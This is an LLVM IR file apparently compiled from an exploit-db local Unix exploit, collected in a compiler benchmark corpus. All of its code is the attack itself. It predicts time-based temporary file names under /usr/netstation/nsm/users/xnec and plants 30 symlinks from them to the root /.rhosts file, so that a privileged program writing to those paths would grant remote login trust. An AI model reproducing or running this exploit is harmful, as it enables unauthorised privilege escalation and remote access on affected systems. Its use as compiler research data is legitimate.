; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_19697.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_19697.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.dest = private unnamed_addr constant [20 x i8] c"/.rhosts\00\00\00\00\00\00\00\00\00\00\00\00", align 16
@__const.main.source = private unnamed_addr constant [50 x i8] c"/usr/netstation/nsm/users/xnec/xnec.nsu\00\00\00\00\00\00\00\00\00\00\00", align 16
@__const.main.sourcesym = private unnamed_addr constant [50 x i8] c"/usr/netstation/nsm/users/xnec/xnec.nsu\00\00\00\00\00\00\00\00\00\00\00", align 16
@.str = private unnamed_addr constant [5 x i8] c"%s%d\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main() #0 {
  %1 = alloca [20 x i8], align 16
  %2 = alloca [50 x i8], align 16
  %3 = alloca [50 x i8], align 16
  %4 = alloca i64, align 8
  %5 = alloca i32, align 4
  %6 = bitcast [20 x i8]* %1 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %6, i8* align 16 getelementptr inbounds ([20 x i8], [20 x i8]* @__const.main.dest, i32 0, i32 0), i64 20, i1 false)
  %7 = bitcast [50 x i8]* %2 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %7, i8* align 16 getelementptr inbounds ([50 x i8], [50 x i8]* @__const.main.source, i32 0, i32 0), i64 50, i1 false)
  %8 = bitcast [50 x i8]* %3 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %8, i8* align 16 getelementptr inbounds ([50 x i8], [50 x i8]* @__const.main.sourcesym, i32 0, i32 0), i64 50, i1 false)
  %9 = call i64 @time(i32 0)
  store i64 %9, i64* %4, align 8
  store i32 0, i32* %5, align 4
  br label %10

10:                                               ; preds = %24, %0
  %11 = load i32, i32* %5, align 4
  %12 = icmp slt i32 %11, 30
  br i1 %12, label %13, label %27

13:                                               ; preds = %10
  %14 = getelementptr inbounds [50 x i8], [50 x i8]* %3, i64 0, i64 0
  %15 = getelementptr inbounds [50 x i8], [50 x i8]* %2, i64 0, i64 0
  %16 = load i64, i64* %4, align 8
  %17 = load i32, i32* %5, align 4
  %18 = sext i32 %17 to i64
  %19 = add nsw i64 %16, %18
  %20 = call i32 @sprintf(i8* %14, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i8* %15, i64 %19)
  %21 = getelementptr inbounds [20 x i8], [20 x i8]* %1, i64 0, i64 0
  %22 = getelementptr inbounds [50 x i8], [50 x i8]* %3, i64 0, i64 0
  %23 = call i32 @symlink(i8* %21, i8* %22)
  br label %24

24:                                               ; preds = %13
  %25 = load i32, i32* %5, align 4
  %26 = add nsw i32 %25, 1
  store i32 %26, i32* %5, align 4
  br label %10

27:                                               ; preds = %10
  ret void
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i64 @time(i32) #2

declare dso_local i32 @sprintf(i8*, i8*, i8*, i64) #2

declare dso_local i32 @symlink(i8*, i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
